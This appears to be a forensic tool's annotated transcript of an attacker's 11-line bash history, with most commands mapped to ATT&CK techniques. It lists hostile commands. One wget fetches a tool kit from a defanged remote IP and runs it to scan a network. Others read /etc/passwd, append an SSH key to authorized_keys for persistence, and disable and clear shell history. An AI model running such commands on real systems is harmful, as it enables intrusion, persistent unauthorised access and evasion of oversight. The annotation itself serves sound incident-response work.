# `bash_history`: interlinear transcript

Sources: `bash_history` (sha256 `76691a8c0bb5`…, 11 lines)

Glosses: 7 rule, 0 model, 0 analyst, 1 none, 3 pending · rules `2026.10.7` · ATT&CK `20.0`

## `bash_history`

```text
   1  id
      T1033 System Owner/User Discovery   [rule: whoami-id]
      Checks which user the session is running as.

   2  cd /tmp
      [context]
      Moves around or lists files; context, not an attack technique.

   3  wget hxxp://203.0.113[.]5/kit.tar.gz
      T1105 Ingress Tool Transfer   [rule: download-file]
      Downloads a file from a remote host to disk.

   4  tar xzf kit.tar.gz
      [pending]

   5  chmod +x kit/run
      T1222.002 Linux and Mac Permissions   [rule: chmod-exec]
      Makes a file executable, typically a payload that was just downloaded.

   6  ./kit/run --scan 198.51.100[.]0/24
      [pending]

   7  cat /etc/passwd
      T1087.001 Local Account   [rule: account-list]
      Lists local user accounts.

   8  echo 'ssh-ed25519 AAAAC3Nzaexamplekey analyst@example[.]com' >> ~/.ssh/authorized_keys
      T1098.004 SSH Authorized Keys   [rule: ssh-authorized-keys]
      Adds an SSH key so the attacker can log in again later.

   9  ping6 -c1 2001[:]db8[:][:]5
      [pending]

  10  unset HISTFILE
      T1690 Prevent Command History Logging   [rule: disable-history]
      Stops the shell from recording commands.

  11  history -c
      T1070.003 Clear Command History   [rule: clear-history]
      Erases the shell command history to hide what was run.
```
